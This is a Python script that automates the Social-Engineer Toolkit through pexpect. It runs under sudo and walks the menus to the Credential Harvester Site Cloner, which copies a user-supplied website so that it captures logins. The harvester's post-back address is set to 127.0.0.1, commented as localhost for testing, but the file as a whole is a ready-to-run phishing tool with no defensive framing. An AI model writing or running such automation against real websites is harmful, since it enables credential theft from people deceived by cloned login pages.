import pexpect

import time



def clone_website(url):

    # Start SET with the necessary command

    command = "sudo setoolkit"

    child = pexpect.spawn(command, encoding='utf-8', timeout=120)  # Extend timeout to 120 seconds



    # Enable logging to see what SET outputs

    logfile = open("setoolkit_log.txt", "w")

    child.logfile = logfile



    # Look for the terms of service prompt and handle it if it appears

    try:

        child.expect("Do you agree to the terms of service [y/n]: ")

        child.sendline("y")  # Agree to the terms

    except pexpect.exceptions.TIMEOUT:

        pass  # If the prompt doesn't appear, continue



    # Function to handle menu navigation with additional debugging

    def navigate_menu(option):

        try:

            # Wait for the main menu prompt

            child.expect("set", timeout=10)  # Adjust timeout as needed

            time.sleep(1)  # Adding a short delay before sending the option

            child.sendline(option)

            print(f"Sent option {option}")

        except pexpect.exceptions.TIMEOUT as e:

            print("Timeout exceeded while waiting for main menu prompt.")

            print(f"Buffer content before timeout: {child.before}")

            print("Check setoolkit_log.txt for details.")

            logfile.close()

            raise e



    # Proceed with the SET menu interactions

    # Simplified navigation for the third option

    navigate_menu("1")  # Option 1: Social-Engineering Attacks

    navigate_menu("2")  # Option 2: Website Attack Vectors

    navigate_menu("3")  # Option 3: Credential Harvester Attack Method

    navigate_menu("2")  # Option 2: Site Cloner



    # Enter the IP address for the POST back in Harvester/Tabnabbing

    navigate_menu("127.0.0.1")  # Localhost for testing



    # Enter the URL of the website to clone

    navigate_menu(url)



    # Wait for the cloning process to complete

    try:

        child.expect(pexpect.EOF, timeout=10)  # Extend timeout for cloning process

    except pexpect.exceptions.TIMEOUT as e:

        print("Timeout exceeded while waiting for EOF.")

        print("Check setoolkit_log.txt for details.")

        logfile.close()

        raise e



    # Print the output of the command

    output = child.before

    print(output)



    # Close the log file

    logfile.close()



if __name__ == "__main__":

    # Prompt the user for the website URL

    website_url = input("Enter the URL of the website to clone: ")

    clone_website(website_url)

